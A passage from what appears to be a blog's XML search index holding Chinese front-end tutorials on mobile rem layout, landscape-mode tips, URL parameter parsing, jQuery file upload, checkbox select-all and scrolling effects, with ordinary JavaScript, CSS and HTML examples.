  </entry>
  <entry>
    <title><![CDATA[移动端开发的单位处理方法]]></title>
    <url>%2Fblog%2Fjavascript%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%BC%80%E5%8F%91rem%E5%8D%95%E4%BD%8D%E9%97%AE%E9%A2%98.html</url>
    <content type="text"><![CDATA[引言在PC端开发的时候我们可以直接根据设计稿上的尺寸，直接使用px像素单位即可，但是由于移动端各个设备的宽度不一致，渲染也不一样，所以在移动端开发时不能直接px单位，常用的是使用rem单位。 设置html的基准字号font-size(hmltFontSize) 121rem = 1 * hmltFontSize2rem = 2 * hmltFontSize 故而只需要在不同的手机设置不同的html的基准字号就可以使程序在不同的设备上显示出来的尺寸不一样 如何实现呢？ css+js设置法123456html&#123; visibility: hidden; /* 初始化设置隐藏，但会渲染 */&#125;body&#123; width: 6.4rem; /* body设置rem单位，因为后面脚本需要利用它来充值基准字号 */&#125; head脚本：1234567891011121314// 默认定义基准字号为100px，对应设计稿为640px。如设计稿尺寸有变，则修改下面的计算方式即可。// 在样式中，使用rem单位的值均为设计稿的0.01倍，如设计稿标320px，则设置3.2rem即可。// 设置根字号window.document.documentElement.style.fontSize = window.document.documentElement.clientWidth / 20 + 'px';// 设置viewport属性，安卓4.5以下均设置为1.0，其余通过计算取得var ua = window.navigator.userAgent.toLowerCase();var dpr = window.devicePixelRatio;var scaleValue = 1.0 / dpr;var metaEl = document.createElement('meta');metaEl.setAttribute('name', 'viewport');if (ua.substr(ua.indexOf('android') + 8, 3) &lt; 4.5) metaEl.setAttribute('content', 'initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no');else metaEl.setAttribute('content', 'initial-scale=' + scaleValue + ', maximum-scale=' + scaleValue + ', minimum-scale=' + scaleValue + ', user-scalable=no');document.getElementsByTagName('head')[0].appendChild(metaEl); body脚本（放在dom之后）：12345678// 重置脚本，配合html初始化设置隐藏，脚本加载完之后显示（防止重置时出现颤抖效果）// 重置原因：rem布局在部分安卓手机webview（魅族、华为）表现异常（会超出屏幕）var html = window.document.documentElement;var body = window.document.body;var htmlWidth = html.clientWidth; // 屏幕宽度var bodyWidth = body.offsetWidth; // 设置满屏rem之后的宽度var ratio = bodyWidth / htmlWidth;html.style.fontSize = (ratio &gt; 0 ? (html.style.fontSize.slice(0, -2) / ratio) : (html.style.fontSize.slice(0, -2) * ratio)) + 'px'; // 重置基准字号 scss+js设置法html中初始化iphone4是320px宽的尺寸，在4上16px的字号表现最合适，故而以此来换算，根据各个手机的宽度，来设置不同的基准字号，如下：12345&lt;script&gt; var html = window.document.documentElement; var sw = html.clientWidth; html.style.fontSize = sw * (16 / 320) + 'px';&lt;/script&gt; 设置了html的基准字号之后，在css里面设置尺寸时就可以使用rem了，乘以html后的值就是设计稿的值。 假设设计稿是640宽的，我们可以拿设计稿的尺寸除以32，得到的就是我们需要设置的rem的值。如一个按钮在640的设计稿上的宽高是200*60，那么css里面设置的就是200/32 rem和60/32 rem了。 假设设计稿是W宽，就是拿设计稿的尺寸除以W * (16 / 320)，也即是除以0.05W。 我们总不能每次都用计算器来算rem的值吧！这样效率会很低，研发时间会很长，不值得。 我们又想，如果CSS能够计算就好了，别说还真有，less、sass或stylus等预处理语言都可以在样式里面写运算表达式了，但是既然是预处理语言，就必须编译成普通的css文件才能被浏览器正常读取。具体变异过程见gulp 以sass为例： 我们可以定义一个函数表达式，如下：1234@function r($px) &#123; @return $px / 32 + rem;&#125;/* 32是根据设计来设定的，设计稿的尺寸*0.05 */ 这样我们在scss的样式就可以使用r(设计稿的尺寸)来表示了，最后编译成css文件就可以被浏览器读取了。 但是，你以为这样就好了吗？ NO! rem布局bug解决在web前端开发的过程中，我们最恨谁，当然是浏览器厂商了，就是不按照一个标准来开发浏览器，各式各样的内核，唉！ 经过测试发现，华为、魅族等手机有一些机型会出现使用rem布局超过一屏出现滚动的情况，真是的 v_v 该怎么解决呢？我是这样做的12345678910let html = window.document.documentElementlet sw = html.clientWidthlet sh = html.clientHeightfunction initRem (dom = 'app') &#123; let operateDom = document.getElementById(dom) let operateDomWidth = operateDom.offsetWidth // 最外层盒子使用rem设置，不能使用% let sRatio = sw / operateDomWidth // 计算比例 html.style.fontSize = html.style.fontSize.slice(0, -2) * sRatio + 'px' // 重置基准字号&#125; 如果谁有更好的解决方案，欢迎告知！ rem布局bug + 单页应用解决办法上面这种都是针对非一屏的页面，you know!作为一名前端开发工程师，最讨厌的除了低版本的兼容外就是开发一屏的页面了，国内手机厂商太黑心，屏幕宽高比层出不穷，一屏的适配真是难倒一片开发人员，但有时一些活动页又必须是一屏的，该怎么做呢？ 最大的难题就是那些宽大高小（对比设计图）的手机，例如iPhone4，我咧个去，几十年的老机子了，还有人在用，阻挡社会的前进啊！有木有。 我们想，只要在手机上面找到设计图的内容就可以了，如图： 但是这种单页的情况下，又得考虑单页 + rembug的情况，开发的时候就是没注意，就被坑惨了 最终代码代码如下：1234567891011121314151617181920let html = window.document.documentElementlet sw = html.clientWidthlet sh = html.clientHeight// 单页面设置内容宽度基准字号（适配）function initSingleRem (dom1 = 'app', dom2 = 'app') &#123; let operateDom1 = document.getElementById(dom1) let operateDom2 = document.getElementById(dom2) let operateDomWidth1 = operateDom1.offsetWidth let operateDomWidth2 = operateDom2.offsetWidth let sRatio1 = ((750 / 1205) * sh) / sw // 设计稿和屏幕的比例 let sRatio2 = sw / operateDomWidth1 // 屏幕和最外层div的比例 if (sh / sw &lt; 1205 / 750) &#123; // 高小宽大的手机 operateDom2.style.width = operateDomWidth2 * sRatio1 * sRatio2 + 'px' // 设置里层div的宽 &#125; html.style.fontSize = html.style.fontSize.slice(0, -2) * sRatio1 * sRatio2 + 'px' // 重置基准字号 operateDom1.style.width = sw + 'px' // 最后将最外层div设为满屏&#125; 这样，所有的内容就在中间黑色的区域内了，就可以达到一屏适配了 终极代码封装成一个库，引用即可12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// 重新设置基准字号（为了兼容部分安卓手机）// 使用initRem()时：最外层div宽必须设置r(750)，不能设置100%）// initSingleRem()时：最外层div和第二层div宽必须设置r(750)，不能设置100%）let html = window.document.documentElementlet sw = html.clientWidthlet sh = html.clientHeight// 非单页设置宽度及基准字号function initRem (dom = 'app') &#123; let operateDom = document.getElementById(dom) let operateDomWidth = operateDom.offsetWidth // 最外层盒子使用rem设置，不能使用% let sRatio = sw / operateDomWidth // 计算比例 html.style.fontSize = html.style.fontSize.slice(0, -2) * sRatio + 'px' // 重置基准字号&#125;// 单页面设置内容宽度基准字号（找到中间区域）function initSingleRem (dom1 = 'app', dom2 = 'app') &#123; let operateDom1 = document.getElementById(dom1) let operateDom2 = document.getElementById(dom2) let operateDomWidth1 = operateDom1.offsetWidth let operateDomWidth2 = operateDom2.offsetWidth let sRatio1 = ((750 / 1205) * sh) / sw // 设计稿和屏幕的比例 let sRatio2 = sw / operateDomWidth1 // 屏幕和最外层div的比例 if (sh / sw &lt; 1205 / 750) &#123; // 高小宽大的手机 operateDom2.style.width = operateDomWidth2 * sRatio1 * sRatio2 + 'px' // 设置里层div的宽 html.style.fontSize = html.style.fontSize.slice(0, -2) * sRatio1 * sRatio2 + 'px' // 重置基准字号 operateDom1.style.width = sw + 'px' // 最后将最外层div设为满屏 &#125; else &#123; html.style.fontSize = html.style.fontSize.slice(0, -2) * sRatio2 + 'px' // 重置基准字号 &#125;&#125;// 单屏且最外层div铺满屏幕（例如满屏列表项）// 注意：布局时对于接近铺满屏幕的线勿直接适用长度值function initSingleWidth (dom) &#123; let operateDom = document.getElementById(dom) operateDom.style.width = sw + 'px'&#125;// 单屏且内部div铺满屏幕（例如页面中部分元素铺满）function initWidth (dom) &#123; let operateDom = document.getElementById(dom) let operateDomWidth = operateDom.offsetWidth operateDom.style.width = sw + 'px' operateDom.style.marginLeft = -(sw - operateDomWidth) / 2 + 'px'&#125;export &#123; initRem, initSingleRem, initSingleWidth, initWidth&#125;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端横屏提示]]></title>
    <url>%2Fblog%2Fjavascript%2F%E7%A7%BB%E5%8A%A8%E6%A8%AA%E5%B1%8F%E6%8F%90%E7%A4%BA.html</url>
    <content type="text"><![CDATA[做移动端开发的时候需要对横屏做处理，否则用户体验很不好 css和js均有检测横屏的机制，但是想要把一个竖屏的网页在横屏上显示出来，各种方法都不太合适 除非制作的是横屏的游戏，否则一律在用户横屏的时候提示用户需竖屏访问 所以增加一段js代码，提示横屏 效果如下： 代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859(function() &#123; var landscapeTip; function createLandscapeTip() &#123; if (!landscapeTip) &#123; landscapeTip = document.createElement('div'); landscapeTip.style.background = 'black'; landscapeTip.style.position = 'fixed'; landscapeTip.style.width = '100%'; landscapeTip.style.height = '100%'; landscapeTip.style.left = 0; landscapeTip.style.top = 0; landscapeTip.style.textAlign = 'center'; landscapeTip.style.zIndex = 99999999999; landscapeTip.style.overflow = 'hidden'; landscapeTip.innerHTML = '&lt;div style="position: absolute; top: 50%; left: 50%; -webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%)"&gt;&lt;img style="height:150px" src="data:image/png;base64,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"/&gt;&lt;br&gt;&lt;div style="height: 1.6rem; color: white; font-size: 18px; text-align: center;"&gt;竖屏浏览,体验更佳&lt;/div&gt;&lt;/div&gt;'; document.body.appendChild(landscapeTip); &#125; &#125; function showLandscapeTip() &#123; if (landscapeTip) &#123; landscapeTip.style.display = 'block'; &#125; &#125; function hideLandscpeTip() &#123; if (landscapeTip) &#123; landscapeTip.style.display = 'none'; &#125; &#125; function updateOrientation() &#123; var orientation = window.orientation; switch (orientation) &#123; case 90: case -90: orientation = 'landscape'; showLandscapeTip(); break; default: orientation = 'portrait'; hideLandscpeTip(); break; &#125; &#125; function initOrientationChange() &#123; createLandscapeTip(); window.addEventListener('orientationchange', updateOrientation, false); landscapeTip.addEventListener('touchstart', function(e) &#123; e.preventDefault(); &#125;, false); updateOrientation(); // showLandscapeTip(); // debug &#125; initOrientationChange();&#125;)();]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ajax请求...进度]]></title>
    <url>%2Fblog%2Fjquery%2Fajax%E8%AF%B7%E6%B1%82...%E8%BF%9B%E5%BA%A6.html</url>
    <content type="text"><![CDATA[效果图： 实现原理:HTML：1&lt;a href="javascript:" id="submit" class="grebtn"&gt;提交订单&lt;/a&gt; CSS：123456789101112131415161718.dotting &#123; display: inline-block; width: 10px; min-height: 2px; padding-right: 2px; border-left: 2px solid currentColor; border-right: 2px solid currentColor; background-color: currentColor; background-clip: content-box; box-sizing: border-box; -webkit-animation: dot 4s infinite step-start both; *zoom: expression(this.innerHTML = '...'); /* IE7 */&#125;.dotting:before &#123; content: '...'; &#125; /* IE8 */.dotting::before &#123; content: ''; &#125;:root .dotting &#123; margin-left: 2px; padding-left: 2px; &#125; /* IE9+ */@-webkit-keyframes dot &#123; 25% &#123; border-color: transparent; background-color: transparent; &#125; /* 0个点 */ 50% &#123; border-right-color: transparent; background-color: transparent; &#125; /* 1个点 */ 75% &#123; border-right-color: transparent; &#125; /* 2个点 */&#125; JS：12345678910$("#submit").bind("click", function() &#123; if (!this.ajaxing) &#123; this.ajaxing = true; this.innerHTML = '提交订单中&lt;span class="ani_dot"&gt;...&lt;/span&gt;'; setTimeout( function() &#123; this.ajaxing = false; this.innerHTML = "提交超时"; &#125;.bind(this), 30000); &#125;&#125;); 说明：同样是4秒动画，每秒钟显示1个点； IE7/IE8实现原理跟上面box-shadow方法一致，都是内容生成，如果无需兼容IE7/IE8, 可以按照第一个例子CSS代码注释说明删除一些CSS； currentColor关键字可以让图形字符化，必不可少； 最大功臣是CSS3 background-clip属性，可以让IE9+浏览器下左右padding没有背景色，于是形成了等分打点效果。CSS3 Background博大精深，有兴趣可参考一篇很赞的文章CSS3 Backgrounds相关介绍，很多图，移动端非wifi慎点； box-sizing是让现代浏览器和IE7/IE8占据宽度完全一样的功臣：IE7/IE8实际宽度是width+padding-right为12像素，其他现代浏览器为width+margin-left也是12像素；这里CSS代码主要用来展示原理，故没有显示-webkit-animation以及@-webkit-keyframes私有前缀，实际目前还是需要的； 优势所在 CSS生成的点没有虚化，效果更好； 占据的尺寸各个浏览器完全一致，都是12像素宽度； 颜色继承； 天然字符化显示，与文字浑然天成；]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解析链接中的参数]]></title>
    <url>%2Fblog%2Fjavascript%2F%E8%A7%A3%E6%9E%90%E9%93%BE%E6%8E%A5%E7%9A%84%E5%8F%82%E6%95%B0.html</url>
    <content type="text"><![CDATA[分析 ？参数：?aaa=true&amp;bbb=false hash参数：#aaa=true&amp;bbb=false 解析?参数方法 利用正则表达式 12345678function getQueryString(name) &#123; var reg = new RegExp("(^|&amp;)" + name + "=([^&amp;]*)(&amp;|$)"); var r = decodeURI(window.location.search).substr(1).match(reg); if (r !== null) return unescape(r[2]); return null;&#125;getQueryString('id'); 利用字符串和数组方法（此方法和解析#参数一致，使用window.location.search） 12345678910111213141516171819function getURLParam(strParamName)&#123; var strReturn=''; var query = this.location.search.substring(1); //获取URL中？后面的部分 if (query.length &gt; 0)&#123; var params = query.split("&amp;"); // 以&amp;符号将参数字符串拆分成数组 for (var i = 0 ; i &lt; params.length ; i++)&#123; var pos = params[i].indexOf("="); var name = params[i].substring(0, pos); // 每个参数对的名称 var value = params[i].substring(pos + 1); // 每个参数对的值 if (name == strParamName) &#123; // 找出需要的参数对的值 strReturn = value; &#125; &#125; &#125; return strReturn;&#125;getURLParam('id');// 原理：利用location.search找到?后面的部分，利用&amp;及split组合拆分成数组，利用=及substring解析出每个数组中的名称和值 解析hash参数方法 利用字符串和数组方法（此方法和解析？参数一致，使用window.location.hash）12345678910111213141516171819function getURLHashParam(strParamName)&#123; var strReturn=''; var query = this.location.hash.substring(1); //获取URL中#后面的部分 if (query.length &gt; 0)&#123; var params = query.split("&amp;"); // 以&amp;符号将参数字符串拆分成数组 for (var i = 0 ; i &lt; params.length ; i++)&#123; var pos = params[i].indexOf("="); var name = params[i].substring(0, pos); // 每个参数对的名称 var value = params[i].substring(pos + 1); // 每个参数对的值 if (name == strParamName) &#123; // 找出需要的参数对的值 strReturn = value; &#125; &#125; &#125; return strReturn;&#125;getURLHashParam('id');// 原理：利用location.hash找到#后面的部分，利用&amp;及split组合拆分成数组，利用=及substring解析出每个数组中的名称和值]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取select的值]]></title>
    <url>%2Fblog%2Fjquery%2Fjquery%E8%8E%B7%E5%8F%96select%E7%9A%84%E5%80%BC.html</url>
    <content type="text"><![CDATA[js方法获取：1234var obj = document.getElementById(&quot;testSelect&quot;); //定位idvar index = obj.selectedIndex; // 选中索引var text = obj.options[index].text; // 选中文本var value = obj.options[index].value; // 选中值 jquery方法获取：123456$(&apos;#testSelect option:selected&apos;).text();//选中的文本$(&apos;#testSelect option:selected&apos;) .val();//选中的值$(&quot;#testSelect&quot;).get(0).selectedIndex;//索引$(&apos;#testSelect&apos;).text();//选中的文本$(&apos;#testSelect&apos;).find(&apos;option:selected&apos;).val();//选中的值]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery上传excel等文件]]></title>
    <url>%2Fblog%2Fjquery%2Fjquery%E4%B8%8A%E4%BC%A0excel%E7%AD%89%E6%96%87%E4%BB%B6.html</url>
    <content type="text"><![CDATA[在实际应用中，有时我们需要将一个excel表上传给后端同学进行数据传递，那么怎么实现呢？ FormData对象法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .test-form&#123; display: inline-block; &#125; .show-name&#123; display: inline-block; width: 200px; height: 36px; line-height: 36px; padding: 0 10px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; border: 1px solid #ccc; vertical-align: middle; &#125; .submit-btn&#123; display: inline-block; width: 80px; height: 36px; border: none; outline: none; vertical-align: middle; font-size: 16px; &#125; .show-error&#123; display: inline-block; height: 36px; line-height: 36px; color: #f00; display: none; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;label&gt; &lt;input type="file" id="testInput" accept=".xls, .xlsx" style="left:-9999px;position:absolute;"&gt; &lt;span class="show-name" id="showName"&gt;请选择你要上传的文件&lt;/span&gt; &lt;/label&gt; &lt;button class="submit-btn" id="submitBtn"&gt;上传&lt;/button&gt; &lt;span class="show-error" id="showError"&gt;&lt;/span&gt; &lt;script src="https://cdn.bootcss.com/jquery/2.2.3/jquery.min.js"&gt;&lt;/script&gt; &lt;script&gt; _fileUpload(); $('#submitBtn').on('click', function (event) &#123; var fileInput = $("#testInput"); var errorText = $('#showError'); if (fileInput.val() === '') &#123; errorText.show().text('对不起，您还没有上传文件'); return false; &#125; var formData = new FormData(); // new FormData对象 var file = fileInput[0].files[0]; // 此处必须这样去到file对象 formData.append('importTeacher', file); $.ajax(&#123; url: "/test.vpage", type: "POST", data: formData, processData: false, // 此处必须设置processData contentType: false, // 此处必须设置contentType async: true, timeout: 5 * 60 * 1000, success: function (data) &#123; if (data.success) &#123; window.alert('上传成功'); &#125; else &#123; errorText.show().text(data.info); &#125; &#125; &#125;) &#125;); function _fileUpload () &#123; $(document).on("change", '#testInput', function () &#123; $('#showError').hide().text(''); var fileInput = $('#testInput').val(); fileInput = fileInput.substring(fileInput.lastIndexOf("\\") + 1); $('#showName').text(fileInput); &#125;); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 温馨提示：FormData()在IE8下会有兼容性 结果图例： 参考：web上传的几种方式]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[复选框全选和取消全选问题]]></title>
    <url>%2Fblog%2Fjquery%2F%E5%A4%8D%E9%80%89%E6%A1%86%E5%85%A8%E9%80%89%E5%8F%96%E6%B6%88%E5%85%A8%E9%80%89%E9%97%AE%E9%A2%98.html</url>
    <content type="text"><![CDATA[结构如下123456全选：&lt;input type="text" class="choiceAll"&gt;北京：&lt;input type="text" class="choiceSingle"&gt;上海：&lt;input type="text" class="choiceSingle"&gt;广州：&lt;input type="text" class="choiceSingle"&gt;深圳：&lt;input type="text" class="choiceSingle"&gt; 最初想到的解决办法：12345678910111213141516$(&apos;.choiceAll&apos;).on(&apos;click&apos;, function () &#123; if ($(this).is(&quot;:checked&quot;)) &#123; toChoiceAll(); &#125; else &#123; toCancelChoiceAll(); &#125;&#125;);// 全选var toChoiceAll = function () &#123; $(&quot;.choiceSingle&quot;).(&quot;checked&quot;, true);&#125;;// 取消全选var toCancelChoiceAll = function () &#123; $(&quot;.choiceSingle&quot;).(&quot;checked&quot;, false); // 或 $(&quot;.choiceSingle&quot;).removeAttr(&quot;checked&quot;);&#125;; 测试的时候我们会发现，第一次全选和取消全选是OK的，但是第二次后会出问题，观察dom，发现第二次全选之后，每个自己复选框的checked确实是移除了，但是页面却没有及时更新，这个时候我们需要遍历每一个然后再处理 正确的处理方法：1234567891011121314151617181920212223242526272829303132333435// 点击全选复选框$(&apos;.choiceAll&apos;).on(&apos;click&apos;, function () &#123; if ($(this).is(&quot;:checked&quot;)) &#123; toChoiceAll(); &#125; else &#123; toCancelChoiceAll(); &#125;&#125;);// 全选var toChoiceAll = function () &#123; $(&quot;.choiceSingle&quot;).each(function()&#123; $(this).prop(&quot;checked&quot;, true); &#125;);&#125;;// 取消全选var toCancelChoiceAll = function () &#123; $(&quot;.choiceSingle&quot;).each(function()&#123; $(this).prop(&quot;checked&quot;, false); &#125;);&#125;;// 点击批量退款按钮$(&apos;#refundBtn&apos;).on(&apos;click&apos;, function (event) &#123; // 下面增加了一个收集子级（其他页面结构）中的某个id值 var checkNode = $(&apos;.choiceSingle&apos;); var idNode = $(&apos;.refundId&apos;); var checkedList = []; for (var i = 0, len = idNode.length; i &lt; len; i++) &#123; if (checkNode.eq(i).is(&quot;:checked&quot;)) &#123; checkedList.push(idNode.eq(i).text()); &#125; &#125; if (checkedList.length === 0) return false; // 用checkedList发起请求 // ...&#125;);]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实现置顶和置底效果]]></title>
    <url>%2Fblog%2Fjquery%2F%E5%AE%9E%E7%8E%B0%E7%BD%AE%E9%A1%B6%E5%92%8C%E7%BD%AE%E5%BA%95.html</url>
    <content type="text"><![CDATA[置顶效果 123456789101112$(window).on('scroll', function() &#123; if ($(window).scrollTop() &gt;= 100) &#123; // 滚动了100之后显示 $('.gotopbox').fadeIn(300); &#125; else &#123; $('.gotopbox').fadeOut(300); &#125;&#125;);$('.gotopbox').on('click', function()&#123; // 点击置顶 $('html, body').animate(&#123; scrollTop: '0px' &#125;, 500);&#125;); 置底效果 123456789101112$(window).on('scroll', function() &#123; if ($(window).scrollTop() &gt;= 100) &#123; // 滚动了100之后显示 $('.gotopbox').fadeIn(300); &#125; else &#123; $('.gotopbox').fadeOut(300); &#125;&#125;);$('.gobottombox').on('click', function()&#123; // 点击置顶 $('html, body').animate(&#123; scrollTop: document.body.clientHeight+'px' &#125;, 500);&#125;);]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取form表单的文件名]]></title>
    <url>%2Fblog%2Fjquery%2F%E8%8E%B7%E5%8F%96form%E8%A1%A8%E5%8D%95%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D.html</url>
    <content type="text"><![CDATA[正则法取文件名上传后input的value值为：”C:\fakepath\工作簿1.xlsx”这种格式 1$('#testInput').val().substring($('#testInput').val().lastIndexOf("\\") + 1) // 第一个表示转义符号]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[输入框实时检测输入情况]]></title>
    <url>%2Fblog%2Fjquery%2F%E8%BE%93%E5%85%A5%E6%A1%86%E5%AE%9E%E6%97%B6%E6%A3%80%E6%B5%8B.html</url>
    <content type="text"><![CDATA[通用版12345678$('.p6-text').on('input',function()&#123;//输入框内容改变时发生的事件 var v = $('.p6-text').val(); //v是实时获取输入框的内容 if ($.trim(v) == '') &#123;//如果输入框内容为空发生的事件 $('.submit-before').show(); &#125;else&#123;//如果输入框内容不为空发生的事件 $('.submit-before').hide(); &#125;;&#125;); IE版12345678$('.p6-text').on('propertychange',function()&#123;//输入框内容改变时发生的事件 var v = $('.p6-text').val(); //v是实时获取输入框的内容 if ($.trim(v) == '') &#123;//如果输入框内容为空发生的事件 $('.submit-before').show(); &#125;else&#123;//如果输入框内容不为空发生的事件 $('.submit-before').hide(); &#125;;&#125;);]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[锚链接平滑滚动]]></title>
